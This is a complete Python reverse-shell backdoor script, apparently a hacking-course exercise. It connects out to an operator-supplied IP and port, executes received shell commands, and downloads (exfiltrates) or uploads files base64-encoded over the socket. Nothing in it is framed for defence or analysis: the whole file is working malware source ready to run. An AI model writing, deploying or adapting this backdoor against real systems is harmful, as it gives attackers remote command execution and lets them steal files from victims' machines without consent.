#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import sys
import argparse

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    def execute_system_commmand(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Change working directory to {}".format(path)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Succesful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_system_commmand(command)
            except Exception:
                command_result = "[-] Error during command Execution : {}".format(command)
            self.reliable_send(command_result)

if __name__ == "__main__":
    parser=argparse.ArgumentParser(description="Simple Reverse-Backdoor executor")
    parser.add_argument("-i","--ip", dest="ip", help="IP address listner", required=True)
    parser.add_argument("-p","--port", dest="port", type=int, help="port number", required=True)
    options = parser.parse_args()
    my_backdoor = Backdoor(options.ip, options.port)
    my_backdoor.run()